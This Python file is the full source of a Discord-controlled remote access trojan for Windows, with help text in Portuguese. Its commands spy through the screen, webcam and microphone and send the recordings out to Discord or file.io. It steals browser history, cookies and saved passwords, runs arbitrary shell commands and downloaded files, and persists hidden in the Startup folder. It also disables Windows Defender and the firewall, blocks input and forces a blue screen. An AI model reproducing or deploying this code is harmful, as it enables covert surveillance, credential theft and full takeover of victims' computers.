import discord
from discord.ext import commands
import ctypes
import sys
import os
import ssl
import asyncio
import platform
import urllib.request
import json
from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
import win32gui
from mss import mss
import cv2
import subprocess
import pyautogui as pag
import sqlite3
import webbrowser
import win32crypt
import json
import sounddevice as sd
from scipy.io.wavfile import write
import requests
import psutil
import shutil

################ HELP FUNCTIONS ################

def isAdmin():
    try:
        return (os.getuid() == 0)
    except AttributeError:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0

def restart_as_admin():
    if not isAdmin():
        executable = sys.executable
        params = ' '.join([f'"{param}"' for param in sys.argv])
        ctypes.windll.shell32.ShellExecuteW(None, "runas", executable, params, None, 1)
        sys.exit()

def volumeup():
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = cast(interface, POINTER(IAudioEndpointVolume))
    if volume.GetMute() == 1:
        volume.SetMute(0, None)
    volume.SetMasterVolumeLevel(volume.GetVolumeRange()[1], None)

def volumedown():
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = cast(interface, POINTER(IAudioEndpointVolume))
    volume.SetMasterVolumeLevel(volume.GetVolumeRange()[0], None)

################# END HELP FUNCTIONS #################

################# VARIABLES #################

restart_as_admin()
prefix = "!"
token = 'Seu Token Aqui'
bot = commands.Bot(command_prefix=prefix, intents=discord.Intents.all(), help_command=None)
ssl._create_default_https_context = ssl._create_unverified_context
channel_name = None

################# END VARIABLES #################

################# Initialize #################

async def activity():
    while True:
        current_window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
        window_displayer = discord.Game(f"Visiting: {current_window}")
        await bot.change_presence(status=discord.Status.online, activity=window_displayer)
        await asyncio.sleep(3)

@bot.event
async def on_ready():
    global channel_name

    with urllib.request.urlopen("https://ipinfo.io/json") as url:
        data = json.loads(url.read().decode())
        flag = data['country']
        ip = data['ip']

    user_name = os.getlogin()
    session_name = f"session-{user_name}"
    
    guild = bot.guilds[0]
    existing_channel = discord.utils.get(guild.channels, name=session_name)

    if existing_channel:
        await existing_channel.delete()

    new_channel = await guild.create_text_channel(session_name)
    channel_name = session_name

    is_admin = isAdmin()
    message = (f"@here :white_check_mark: New session opened {session_name} | {platform.system()} "
               f"{platform.release()} |  :flag_{flag.lower()}: | User: {user_name} | IP: {ip}")
    if is_admin:
        message += " | admin!"
    
    await new_channel.send(message)
    
    game = discord.Game(f"Window logging stopped")
    await bot.change_presence(status=discord.Status.online, activity=game)

    bot.loop.create_task(activity())

def split_message(message, limit=2000):
    adjusted_limit = limit - 6
    return [message[i:i+adjusted_limit] for i in range(0, len(message), adjusted_limit)]



@bot.command(name='help', help="Mostra esta mensagem de ajuda.")
async def help(ctx):
    help_message = "Comandos Disponíveis:\n\n"
    for command in bot.commands:
        help_message += f"{prefix}{command.name:<15} -> {command.help}\n"
    parts = split_message(help_message)
    for part in parts:
        await ctx.send(f"```{part}```")



################# END Initialize #################

################# COMMANDS #################

# utils

@bot.command(name='kill', help=f'Mata um canal ou todos os canais com "session" no nome. Uso: {prefix}kill <nome do canal> ou !kill all')
async def kill(ctx, *, target_channel: str):
    total_channels = [ch.name for ch in bot.get_all_channels() if "session" in ch.name]

    if target_channel == "all":
        for channel_name in total_channels:
            channel_to_delete = discord.utils.get(bot.get_all_channels(), name=channel_name)
            if channel_to_delete:
                await channel_to_delete.delete()
        await ctx.send("[*] All session channels killed.")
    else:
        channel_to_delete = discord.utils.get(bot.get_all_channels(), name=target_channel)
        if channel_to_delete:
            await channel_to_delete.delete()
            await ctx.send(f"[*] {target_channel} killed.")
        else:
            await ctx.send(f"[!] {target_channel} is invalid, please enter a valid session name.")

#==================================================================================================#

# privacidade

@bot.command(name='screenshot', help=f'Tira um screenshot da tela e envia para o canal atual. Uso: {prefix}screenshot')
async def screenshot(ctx):
    with mss() as sct:
        sct.shot(output='screenshot.png')
    await ctx.send(file=discord.File('screenshot.png'))
    os.remove('screenshot.png')
    
@bot.command(name='webcampic', help=f'Tira uma foto da webcam e envia para o canal atual. Uso: {prefix}webcampic')
async def webcam_pic(ctx):
    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        await ctx.send("[!] Não foi possível acessar a webcam.")
        return
    ret, frame = cap.read()
    if not ret or frame is None:
        await ctx.send("[!] Não foi possível capturar a imagem da webcam.")
        cap.release()
        return
    cv2.imwrite('webcam_pic.png', frame)
    cap.release()
    await ctx.send(file=discord.File('webcam_pic.png'))
    os.remove('webcam_pic.png')

@bot.command(name='audio', help=f'Grava o áudio do computador e envia para o canal atual. Uso: {prefix}audio <duração em segundos>')
async def audio(ctx, duration: float):
    try:
        temp = os.getenv('TEMP')
        output_path = os.path.join(temp, "output.wav")
        fs = 44100
        await ctx.send(f"[*] Gravando áudio por {duration} segundos...")
        myrecording = sd.rec(int(duration * fs), samplerate=fs, channels=2)
        sd.wait()
        write(output_path, fs, myrecording)
        file_size = os.stat(output_path).st_size

        if file_size > 7340032:
            await ctx.send("O arquivo é maior que 8 MB, isso pode demorar. Aguarde...")
            
            with open(output_path, 'rb') as f:
                response = requests.post('https://file.io/', files={"file": f})
                download_link = response.json().get("link")
            
            if download_link:
                await ctx.send(f"Link para download do áudio: {download_link}")
            else:
                await ctx.send("[!] Falha ao fazer upload do arquivo para o serviço.")
        else:
            await ctx.send("[*] Áudio gravado com sucesso.", file=discord.File(output_path, "output.wav"))

        os.remove(output_path)
        
    except Exception as e:
        await ctx.send(f"[!] Ocorreu um erro ao gravar o áudio: {str(e)}")


@bot.command(name='webcamrecord', help=f'Grava um vídeo da webcam e envia para o canal atual. Uso: {prefix}webcamrecord <duração em segundos>')
async def webcam_record(ctx, duration: int):
    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        await ctx.send("[!] Não foi possível acessar a webcam.")
        return
    fourcc = cv2.VideoWriter_fourcc(*'XVID')
    out = cv2.VideoWriter('webcam_record.avi', fourcc, 20.0, (640, 480))
    start_time = cv2.getTickCount()
    while (cv2.getTickCount() - start_time) / cv2.getTickFrequency() < duration:
        ret, frame = cap.read()
        if not ret or frame is None:
            await ctx.send("[!] Não foi possível capturar o vídeo da webcam.")
            cap.release()
            out.release()
            return
        out.write(frame)
    cap.release()
    out.release()
    await ctx.send(file=discord.File('webcam_record.avi'))
    os.remove('webcam_record.avi')

@bot.command(name='screenrecord', help=f'Grava um vídeo da tela e envia para o canal atual. Uso: {prefix}screenrecord <duração em segundos>')
async def screen_record(ctx, duration: int):
    with mss() as sct:
        out = cv2.VideoWriter('screen_record.avi', cv2.VideoWriter_fourcc(*'XVID'), 20.0, (1920, 1080))
        start_time = cv2.getTickCount()
        while (cv2.getTickCount() - start_time) / cv2.getTickFrequency() < duration:
            frame = sct.grab(sct.monitors[1])
            img = cv2.cvtColor(cv2.resize(frame, (1920, 1080)), cv2.COLOR_BGRA2BGR)
            out.write(img)
        out.release()
    await ctx.send(file=discord.File('screen_record.avi'))
    os.remove('screen_record.avi')

#==================================================================================================#

# trollagem

@bot.command(name='volumeup', help='Aumenta o volume do computador. Uso: !volumeup')
async def volume_up(ctx):
    volumeup()
    await ctx.send("[*] Volume up to 100%")

@bot.command(name='volumedown', help=f'Diminui o volume do computador. Uso: {prefix}volumedown')
async def volume_down(ctx):
    volumedown()
    await ctx.send("[*] Volume down to 0%")

@bot.command(name='voice', help=f'Fala a mensagem especificada. Uso: {prefix}voice <mensagem>')
async def voice(ctx, *, message: str):
    subprocess.run(f"PowerShell -Command Add-Type -AssemblyName System.Speech; (New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak('{message}')", shell=True)
    await ctx.send(f"[*] Voice message: {message}")

@bot.command(name='playvideo', help=f'Toca o vídeo especificado. Uso: {prefix}playvideo <url do vídeo>')
async def playvideo(ctx, url: str):
    urllib.request.urlretrieve(url, "video.mp4")
    subprocess.run("start video.mp4", shell=True)
    await ctx.send("[*] Video played.")

@bot.command(name='playaudio', help=f'Toca o áudio especificado em background. Uso: {prefix}playaudio <url do áudio>')
async def playaudio(ctx, url: str):
    urllib.request.urlretrieve(url, "audio.mp3")
    subprocess.Popen(f"start wmplayer audio.mp3", shell=True)
    await ctx.send("[*] Audio played.")

@bot.command(name='displayoff', help=f'Desliga o monitor. Uso: {prefix}displayoff')
async def displayoff(ctx):
    ctypes.windll.user32.SendMessageW(0xFFFF, 0x112, 0xF170, 2)
    await ctx.send("[*] Display off.")

@bot.command(name='displayon', help=f'Liga o monitor. Uso: {prefix}displayon')
async def displayon(ctx):
    ctypes.windll.user32.SendMessageW(0xFFFF, 0x112, 0xF170, -1)
    await ctx.send("[*] Display on.")

#==================================================================================================#

# controle

@bot.command(name='message', help=f'Envia um popup com a mensagem especificada. Uso: {prefix}message <mensagem>')
async def message(ctx, *, message: str):
    ctypes.windll.user32.MessageBoxW(0, message, "System Alert", 0x40 | 0x1)

@bot.command(name='wallpaper', help=f'Muda o papel de parede do computador para a imagem especificada. Uso: {prefix}wallpaper <url da imagem>')
async def wallpaper(ctx, url: str):
    urllib.request.urlretrieve(url, "wallpaper.jpg")
    ctypes.windll.user32.SystemParametersInfoW(20, 0, "wallpaper.jpg", 0)
    await ctx.send("[*] Wallpaper changed.")

#==================================================================================================#

# shell

@bot.command(name='shell', help=f'Executa um comando no shell. Uso: {prefix}shell <comando>')
async def shell(ctx, *, command: str):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        output = result.stdout if result.stdout else result.stderr
        if output:
            if len(output) > 2000:
                with open("output.txt", "w") as f:
                    f.write(output)
                await ctx.send(file=discord.File("output.txt"))
            else:
                await ctx.send(f"```\n{output}\n```")
        else:
            await ctx.send("[*] Comando executado, mas sem saída.")
    except Exception as e:
        await ctx.send(f"[!] Ocorreu um erro ao executar o comando: {str(e)}")

@bot.command(name='shellbg', help=f'Executa um comando no shell em background. Uso: {prefix}shellbg <comando>')
async def shellbg(ctx, *, command: str):
    try:
        subprocess.Popen(command, shell=True)
        await ctx.send("[*] Comando executado em background.")
    except Exception as e:
        await ctx.send(f"[!] Ocorreu um erro ao executar o comando: {str(e)}")

@bot.command(name='cd', help=f'Muda o diretório de trabalho do bot. Uso: {prefix}cd <diretório>')
async def cd(ctx, *, directory: str):
    try:
        os.chdir(directory)
        await ctx.send(f"[*] Diretório alterado para {directory}")
    except Exception as e:
        await ctx.send(f"[!] Ocorreu um erro ao mudar o diretório: {str(e)}")

@bot.command(name='pwd', help=f'Mostra o diretório de trabalho atual. Uso: {prefix}pwd')
async def pwd(ctx):
    await ctx.send(f"[*] Diretório atual: {os.getcwd()}")

@bot.command(name='ls', help=f'Lista os arquivos e diretórios no diretório atual. Uso: {prefix}ls')
async def ls(ctx):
    try:
        files = os.listdir()
        await ctx.send(f"[*] Arquivos e diretórios no diretório atual: {files}")
    except Exception as e:
        await ctx.send(f"[!] Ocorreu um erro ao listar os arquivos e diretórios: {str(e)}")

@bot.command(name='cat', help=f'Lê o conteúdo de um arquivo. Uso: {prefix}cat <arquivo>')
async def cat(ctx, file: str):
    try:
        with open(file, 'r') as f:
            content = f.read()
        await ctx.send(f"```\n{content}\n```")
    except Exception as e:
        await ctx.send(f"[!] Ocorreu um erro ao ler o arquivo: {str(e)}")

@bot.command(name='clipboard', help=f'Obtém o conteúdo da área de transferência. Uso: {prefix}clipboard')
async def clipboard(ctx):
    try:
        clipboard_content = pag.paste()
        await ctx.send(f"[*] Conteúdo da área de transferência: {clipboard_content}")
    except Exception as e:
        await ctx.send(f"[!] Ocorreu um erro ao obter o conteúdo da área de transferência: {str(e)}")

@bot.command(name='clipboardset', help=f'Configura o conteúdo da área de transferência. Uso: {prefix}clipboardset <texto>')
async def clipboardset(ctx, *, text: str):
    try:
        pag.copy(text)
        await ctx.send("[*] Conteúdo da área de transferência configurado.")
    except Exception as e:
        await ctx.send(f"[!] Ocorreu um erro ao configurar o conteúdo da área de transferência: {str(e)}")

@bot.command(name='upload', help=f'Baixa um arquivo do link especificado e salva no diretório atual. Uso: {prefix}upload <url>')
async def upload(ctx, url: str):
    try:
        file_name = url.split("/")[-1]
        urllib.request.urlretrieve(url, file_name)
        await ctx.send(f"[*] Arquivo {file_name} baixado.")
    except Exception as e:
        await ctx.send(f"[!] Ocorreu um erro ao baixar o arquivo: {str(e)}")

@bot.command(name='execute', help=f'Executa um arquivo no diretório atual. Uso: {prefix}execute <arquivo>')
async def execute(ctx, file: str):
    try:
        subprocess.Popen(file, shell=True)
        await ctx.send(f"[*] Arquivo {file} executado.")
    except Exception as e:
        await ctx.send(f"[!] Ocorreu um erro ao executar o arquivo: {str(e)}")

#==================================================================================================#

# input

@bot.command(name='write', help=f'Escreve um texto na tela. Caso use "enter" no texto, será enviado um enter. Uso: {prefix}write <texto>')
async def write(ctx, *, text: str):
    for char in text:
        if char == " ":
            pag.typewrite(" ")
        elif char == "\n":
            pag.press("enter")
        else:
            pag.typewrite(char)
    await ctx.send("[*] Texto escrito.")

@bot.command(name='key', help=f'Pressiona uma tecla. Uso: {prefix}key <tecla>')
async def key(ctx, key: str):
    pag.press(key)
    await ctx.send(f"[*] Tecla {key} pressionada.")

@bot.command(name='keylist', help=f'Lista de teclas disponíveis para uso.')
async def keylist(ctx):
    keys = pag.KEYBOARD_KEYS
    await ctx.send(f"[*] Teclas disponíveis: {keys}")

@bot.command(name='mouse', help=f'Move o mouse para a posição especificada. Uso: {prefix}mouse <x> <y>')
async def mouse(ctx, x: int, y: int):
    pag.moveTo(x, y)
    await ctx.send(f"[*] Mouse movido para ({x}, {y}).")

@bot.command(name='click', help=f'Clica com o botão esquerdo do mouse na posição atual. Uso: {prefix}click')
async def click(ctx):
    pag.click()
    await ctx.send("[*] Mouse clicado.")

@bot.command(name='rightclick', help=f'Clica com o botão direito do mouse na posição atual. Uso: {prefix}rightclick')
async def rightclick(ctx):
    pag.rightClick()
    await ctx.send("[*] Mouse clicado com o botão direito.")

@bot.command(name='blockinput', help=f'Bloqueia a entrada do mouse e do teclado. Uso: {prefix}blockinput')
async def blockinput(ctx):
    if isAdmin():
        ctypes.windll.user32.BlockInput(True)
        await ctx.send("[*] Entrada do mouse e do teclado bloqueada.")
    else:
        await ctx.send("[!] Permissões de administrador são necessárias para bloquear a entrada.")

@bot.command(name='unblockinput', help=f'Desbloqueia a entrada do mouse e do teclado. Uso: {prefix}unblockinput')
async def unblockinput(ctx):
    if isAdmin():
        ctypes.windll.user32.BlockInput(False)
        await ctx.send("[*] Entrada do mouse e do teclado desbloqueada.")
    else:
        await ctx.send("[!] Permissões de administrador são necessárias para desbloquear a entrada.")

#==================================================================================================#

# navegador

@bot.command(name='history', help=f'Lista o histórico de navegação do Firefox e do Chrome. Uso: {prefix}history')
async def history(ctx):
    try:
        all_urls = []

        # Firefox
        try:
            firefox_history_path = os.path.join(os.getenv('APPDATA'), 'Mozilla', 'Firefox', 'Profiles')
            profiles = os.listdir(firefox_history_path)

            for profile in profiles:
                history_db = os.path.join(firefox_history_path, profile, 'places.sqlite')
                
                if os.path.exists(history_db):
                    connection = sqlite3.connect(history_db)
                    cursor = connection.cursor()
                    cursor.execute("SELECT url FROM moz_places")
                    urls = cursor.fetchall()
                    connection.close()
                    all_urls.extend([url[0] for url in urls])

        except Exception as e:
            await ctx.send(f"[!] Ocorreu um erro ao listar o histórico do Firefox: {str(e)}")

        # Chrome
        try:
            chrome_history_path = os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Default', 'History')
            
            if os.path.exists(chrome_history_path):
                connection = sqlite3.connect(chrome_history_path)
                cursor = connection.cursor()
                cursor.execute("SELECT url FROM urls")
                urls = cursor.fetchall()
                connection.close()
                all_urls.extend([url[0] for url in urls])

        except Exception as e:
            await ctx.send(f"[!] Ocorreu um erro ao listar o histórico do Chrome: {str(e)}")
        if len(all_urls) > 10:
            with open('history.txt', 'w') as f:
                f.write("\n".join(all_urls))
            await ctx.send(file=discord.File('history.txt'))
        else:
            await ctx.send(f"[*] Histórico de navegação: {all_urls}")

    except Exception as e:
        await ctx.send(f"[!] Ocorreu um erro ao listar o histórico de navegação: {str(e)}")

@bot.command(name='openurl', help=f'Abre uma URL no navegador padrão. Uso: {prefix}openurl <url>')
async def openurl(ctx, url: str):
    webbrowser.open(url)
    await ctx.send(f"[*] URL {url} aberta no navegador padrão.")

@bot.command(name='cookies', help=f'Lista os cookies armazenados no Firefox e no Chrome. Uso: {prefix}cookies')
async def cookies(ctx):
    try:
        all_cookies = []

        # Cookies do Firefox
        try:
            firefox_cookies_path = os.path.join(os.getenv('APPDATA'), 'Mozilla', 'Firefox', 'Profiles')
            profiles = os.listdir(firefox_cookies_path)

            for profile in profiles:
                cookies_db = os.path.join(firefox_cookies_path, profile, 'cookies.sqlite')
                
                if os.path.exists(cookies_db):
                    connection = sqlite3.connect(cookies_db)
                    cursor = connection.cursor()
                    cursor.execute("SELECT host, name, value FROM moz_cookies")
                    cookies = cursor.fetchall()
                    connection.close()
                    all_cookies.extend([f"Host: {cookie[0]}, Name: {cookie[1]}, Value: {cookie[2]}" for cookie in cookies])

        except Exception as e:
            await ctx.send(f"[!] Ocorreu um erro ao listar os cookies do Firefox: {str(e)}")

        # Cookies do Chrome
        try:
            chrome_cookies_path = os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Default', 'Cookies')
            
            if os.path.exists(chrome_cookies_path):
                connection = sqlite3.connect(chrome_cookies_path)
                cursor = connection.cursor()
                cursor.execute("SELECT host_key, name, value FROM cookies")
                cookies = cursor.fetchall()
                connection.close()
                all_cookies.extend([f"Host: {cookie[0]}, Name: {cookie[1]}, Value: {cookie[2]}" for cookie in cookies])

        except Exception as e:
            await ctx.send(f"[!] Ocorreu um erro ao listar os cookies do Chrome: {str(e)}")

        if len(all_cookies) > 10:
            with open('cookies.txt', 'w') as f:
                f.write("\n".join(all_cookies))
            await ctx.send(file=discord.File('cookies.txt'))
        else:
            await ctx.send(f"[*] Cookies armazenados: {all_cookies}")

    except Exception as e:
        await ctx.send(f"[!] Ocorreu um erro ao listar os cookies: {str(e)}")

@bot.command(name='passwords', help=f'Lista as senhas armazenadas no Firefox e no Chrome. Uso: {prefix}passwords')
async def passwords(ctx):
    try:
        all_passwords = []

        # Senhas do Firefox
        try:
            firefox_profile_path = os.path.join(os.getenv('APPDATA'), 'Mozilla', 'Firefox', 'Profiles')
            profiles = os.listdir(firefox_profile_path)

            for profile in profiles:
                logins_file = os.path.join(firefox_profile_path, profile, 'logins.json')

                if os.path.exists(logins_file):
                    with open(logins_file, 'r') as f:
                        logins_data = json.load(f)
                        for login in logins_data['logins']:
                            hostname = login['hostname']
                            username = login['encryptedUsername']  # Criptografado
                            password = login['encryptedPassword']  # Criptografado
                            all_passwords.append(f"Host: {hostname}, Username (encrypted): {username}, Password (encrypted): {password}")

        except Exception as e:
            await ctx.send(f"[!] Ocorreu um erro ao listar as senhas do Firefox: {str(e)}")

        # Senhas do Chrome
        try:
            chrome_login_db = os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')

            if os.path.exists(chrome_login_db):
                connection = sqlite3.connect(chrome_login_db)
                cursor = connection.cursor()
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                logins = cursor.fetchall()
                connection.close()

                for login in logins:
                    origin_url = login[0]
                    username = login[1]
                    encrypted_password = login[2]

                    try:
                        password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode()
                    except:
                        password = "Descriptografia falhou"

                    all_passwords.append(f"Host: {origin_url}, Username: {username}, Password: {password}")

        except Exception as e:
            await ctx.send(f"[!] Ocorreu um erro ao listar as senhas do Chrome: {str(e)}")

        if len(all_passwords) > 10:
            with open('passwords.txt', 'w') as f:
                f.write("\n".join(all_passwords))
            await ctx.send(file=discord.File('passwords.txt'))
        else:
            await ctx.send(f"[*] Senhas armazenadas: {all_passwords}")

    except Exception as e:
        await ctx.send(f"[!] Ocorreu um erro ao listar as senhas: {str(e)}")

#==================================================================================================#

# sistema

@bot.command(name='processes', help=f'Lista os processos em execução no sistema. Uso: {prefix}processes')
async def processes(ctx):
    try:
        processes = subprocess.run("tasklist", shell=True, capture_output=True, text=True)
        output = processes.stdout
        if len(output) > 2000:
            with open("processes.txt", "w") as f:
                f.write(output)
            await ctx.send(file=discord.File("processes.txt"))
            os.remove("processes.txt")
        else:
            await ctx.send(f"```\n{output}\n```")
    except Exception as e:
        await ctx.send(f"[!] Ocorreu um erro ao listar os processos: {str(e)}")

@bot.command(name='killprocess', help=f'Mata um processo em execução no sistema. Uso: {prefix}killprocess <nome do processo>')
async def killprocess(ctx, process_name: str):
    try:
        subprocess.run(f"taskkill /f /im {process_name}", shell=True)
        await ctx.send(f"[*] Processo {process_name} morto.")
    except Exception as e:
        await ctx.send(f"[!] Ocorreu um erro ao matar o processo: {str(e)}")

@bot.command(name='startup', help=f'Se coloca para iniciar com o sistema e coloca o atributo de oculto. Uso: {prefix}startup')
async def startup(ctx):
    try:
        bot_path = sys.argv[0]
        bot_name = os.path.basename(bot_path)
        startup_path_en = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', bot_name)
        startup_path_pt = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Menu Iniciar', 'Programas', 'Inicializar', bot_name)
        if os.path.exists(startup_path_en):
            startup_path = startup_path_en
        elif os.path.exists(startup_path_pt):
            startup_path = startup_path_pt
        else:
            await ctx.send("[!] Pasta de inicialização não encontrada.")
            return
        shutil.copy(bot_path, startup_path)
        subprocess.run(f"attrib +s +h \"{startup_path}\"", shell=True)
        await ctx.send("[*] Bot configurado para iniciar com o sistema e oculto.")
    except Exception as e:
        await ctx.send(f"[!] Ocorreu um erro ao configurar o bot para iniciar com o sistema: {str(e)}")

@bot.command(name='shutdown', help=f'Desliga o computador. Uso: {prefix}shutdown')
async def shutdown(ctx):
    try:
        subprocess.run("shutdown /s /t 0", shell=True)
        await ctx.send("[*] Computador desligado.")
    except Exception as e:
        await ctx.send(f"[!] Ocorreu um erro ao desligar o computador: {str(e)}")

@bot.command(name='restart', help=f'Reinicia o computador. Uso: {prefix}restart')
async def restart(ctx):
    try:
        subprocess.run("shutdown /r /t 0", shell=True)
        await ctx.send("[*] Computador reiniciado.")
    except Exception as e:
        await ctx.send(f"[!] Ocorreu um erro ao reiniciar o computador: {str(e)}")

@bot.command(name='lock', help=f'Bloqueia o computador. Uso: {prefix}lock')
async def lock(ctx):
    try:
        ctypes.windll.user32.LockWorkStation()
        await ctx.send("[*] Computador bloqueado.")
    except Exception as e:
        await ctx.send(f"[!] Ocorreu um erro ao bloquear o computador: {str(e)}")

@bot.command(name='logoff', help=f'Desloga o usuário atual. Uso: {prefix}logoff')
async def logoff(ctx):
    try:
        subprocess.run("shutdown /l", shell=True)
        await ctx.send("[*] Usuário deslogado.")
    except Exception as e:
        await ctx.send(f"[!] Ocorreu um erro ao deslogar o usuário: {str(e)}")

@bot.command(name='bluescreen', help=f'Causa uma tela azul da morte. Uso: {prefix}bluescreen')
async def bluescreen(ctx):
    try:
        if ctypes.windll.shell32.IsUserAnAdmin():
            ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
            ctypes.windll.ntdll.NtRaiseHardError(0xC000007B, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint()))
        else:
            await ctx.send("[!] Permissões de administrador são necessárias para causar uma tela azul.")
    except Exception as e:
        await ctx.send(f"[!] Ocorreu um erro: {str(e)}")

@bot.command(name='disableantivirus', help=f'Desativa o antivírus do Windows Defender. Uso: {prefix}disableantivirus')
async def disableantivirus(ctx):
    try:
        subprocess.run("powershell Set-MpPreference -DisableRealtimeMonitoring $true", shell=True)
        await ctx.send("[*] Antivírus desativado.")
    except Exception as e:
        await ctx.send(f"[!] Ocorreu um erro ao desativar o antivírus: {str(e)}")

@bot.command(name='disablefirewall', help=f'Desativa o firewall do Windows. Uso: {prefix}disablefirewall')
async def disablefirewall(ctx):
    try:
        subprocess.run("netsh advfirewall set allprofiles state off", shell=True)
        await ctx.send("[*] Firewall desativado.")
    except Exception as e:
        await ctx.send(f"[!] Ocorreu um erro ao desativar o firewall: {str(e)}")

@bot.command(name='hide', help=f'Oculta o bot. Uso: {prefix}hide')
async def hide(ctx):
    try:
        ctypes.windll.kernel32.SetConsoleWindowInfo(ctypes.windll.kernel32.GetConsoleWindow(), True, False)
        await ctx.send("[*] Bot oculto.")
    except Exception as e:
        await ctx.send(f"[!] Ocorreu um erro ao ocultar o bot: {str(e)}")

@bot.command(name='criticprocess', help=f'Coloca um processo em modo crítico. Uso: {prefix}criticprocess <nome do processo>')
async def criticprocess(ctx, process_name: str):
    try:
        process_found = None
        for proc in psutil.process_iter(['name']):
            if proc.info['name'] == process_name:
                process_found = proc
                break

        if process_found:
            PROCESS_TERMINATE = 1
            process_handle = ctypes.windll.kernel32.OpenProcess(PROCESS_TERMINATE, False, process_found.pid)
            if process_handle:
                ctypes.windll.ntdll.RtlAdjustPrivilege(20, 1, 0, ctypes.byref(ctypes.c_bool()))
                ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0) == 0
                await ctx.send(f"[*] O processo {process_name} ({process_found.pid}) agora é um processo crítico.")
            else:
                await ctx.send(f"[!] Não foi possível abrir o processo {process_name}.")
        else:
            await ctx.send(f"[!] Processo {process_name} não encontrado.")
    except Exception as e:
        await ctx.send(f"[!] Ocorreu um erro ao colocar o processo em modo crítico: {str(e)}")

@bot.command(name='selfcritic', help=f'Coloca o bot em modo crítico. Uso: {prefix}selfcritic')
async def selfcritic(ctx):
    try:
        PROCESS_TERMINATE = 1
        process_handle = ctypes.windll.kernel32.OpenProcess(PROCESS_TERMINATE, False, os.getpid())
        if process_handle:
            ctypes.windll.ntdll.RtlAdjustPrivilege(20, 1, 0, ctypes.byref(ctypes.c_bool()))
            ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0) == 0
            await ctx.send("[*] Bot agora é um processo crítico.")
        else:
            await ctx.send("[!] Não foi possível abrir o bot.")
    except Exception as e:
        await ctx.send(f"[!] Ocorreu um erro ao colocar o bot em modo crítico: {str(e)}")

#==================================================================================================#

bot.run(token)
